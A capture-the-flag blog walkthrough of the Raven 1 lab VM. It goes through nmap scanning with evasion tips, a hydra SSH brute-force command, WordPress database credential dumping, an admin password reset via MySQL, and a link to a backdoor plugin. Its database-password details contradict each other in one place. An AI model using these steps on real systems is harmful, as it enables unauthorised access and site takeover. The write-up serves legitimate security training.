---
title: Raven 1 Walkthrough
author: alex
date: Tue 23 Jan 11:15:48 CEST 2024
categories: [Walkthroughs]
tags: [oscp, ctf, walkthroughs, vulnhub]
img_path: /assets/img/posts/2024-01-23-raven-1-walkthrough/
image:
  path: VirtualBox_Kali_23_01_2024_12_30_26.png
  alt: Raven Security
---

Today I'm hacking into **Raven 1**. This VM is a **WordPress** website that we will be taking over through **MySQL**.

## Methodology

1. Reconnaissance
2. Enumeration
3. Exploitation
   - Gaining admin access

## Tools Used

- Netdiscover
- Nmap
- Dirb

## Recon

Let's scan the network to discover our target's IP address:

```bash
sudo netdiscover
```
And here's the output:

```
 Currently scanning: 192.168.13.0/16   |   Screen View: Unique Hosts                                               
                                                                                                                   
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                   
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     08:00:27:b9:a6:34      1      60  PCS Systemtechnik GmbH                                          
 192.168.1.57    08:00:27:f0:a8:9f      1      60  PCS Systemtechnik GmbH       
```
## Enumeration 

After getting the IP address of the target we now need to enumerate the target for open ports and protocols. I have used **Nmap** aggressive command for that: 

```bash
sudo nmap -p- -T4 -A -O -v 192.168.1.57
```

> **IDS & FW TRIGGERING** 
> 
> In real world situations, **this scans may trigger firewalls and other network security appliances.** If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable. You can also use `-D` for decoy. Check the Nmap theory **[here!](/posts/oscpath-oscp-certification-guide/#port-scanning)**
{: .prompt-warning }

And the output...

```
PORT      STATE SERVICE VERSION
 
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)

80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Raven Security
|_http-server-header: Apache/2.4.10 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40318/udp6  status
|   100024  1          47114/tcp   status
|   100024  1          52052/udp   status
|_  100024  1          58944/tcp6  status

47114/tcp open  status  1 (RPC #100024)

MAC Address: 08:00:27:F0:A8:9F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 199.638 days (since Thu Jul  6 21:57:36 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see some interesting ports open here. 

- **Port 22:** Nothing interesting so far when trying to connect via SSH.

- **Port 80:** Before we open the browser, we should modify the file */etc/hosts* to add a line to make the IP point to **raven.local** like this:



Let's open the browser and search for **raven.local**. We find a web page, let's keep going with the recon before trying anything here.

Let's enumerate the directories of the website with `dirb`: `sudo dirb http://192.168.1.57/`. And we find a couple of interesting directories: `/wordpress/` and `/wordpress/wp-admin/`. If we look around the blog, we can see a user publishing under the name **michael**.

Let's try to brute force SSH: `sudo hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.57 -s22 -I ssh -v`

And we get a password: `michael:michael`.

Once inside, let's download **Linux Exploit Suggester** from our own Apache server. Now, if we run it, we can see some hardcoded credentials:

```bash
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3134 Aug 13  2018 /var/www/html/wordpress/wp-config.php                              
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', '');
define('DB_HOST', 'localhost');
```

## Exploitation

So, let's run MySQL to try to get some creds! `mysql -u root -p` and when prompted for a password: `R@v3nSecurity`. Once inside the console, let's see the databases:

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.00 sec)
```

OK, let's open `wordpress` databse:

```bash
mysql> use wordpress;
Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)
```

And now, let's dump all the info in the table `wp_users`:

```bash
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | $P$BCyo7B9rkxgGPHpOuSInX8KE1izjh6. | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | 81dc9bdb52d04dc20036dbd8313ed055   | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
2 rows in set (0.00 sec)
```

Here, I have already changed `steven`'s password to 1234 hashed with MD5. So, let's change `michael`'s password as well: `update wp_users set user_pass=MD5('1234') where ID=1;` And, if we dump the table aganin:

```bash
mysql> update wp_users set user_pass=MD5('1234') where ID=1;
Query OK, 1 row affected (0.03 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> select * from wp_users;
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | 81dc9bdb52d04dc20036dbd8313ed055 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | 81dc9bdb52d04dc20036dbd8313ed055 | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
2 rows in set (0.00 sec)
```

![WP Login](VirtualBox_Kali_23_01_2024_11_37_38.png)

Let's go back to `/wordpress/wp-login` and try to login using `michael:1234`. And voilà! Now we have taken control over the website with admin privileges. 

![WP Admin](VirtualBox_Kali_23_01_2024_11_38_00.png)

The CTF ends here but, why don't you play around uploading my backdoor plugin? **[Here](https://amtzespinosa.github.io/posts/wordpress-backdoor-plugin/)** yo can find it!
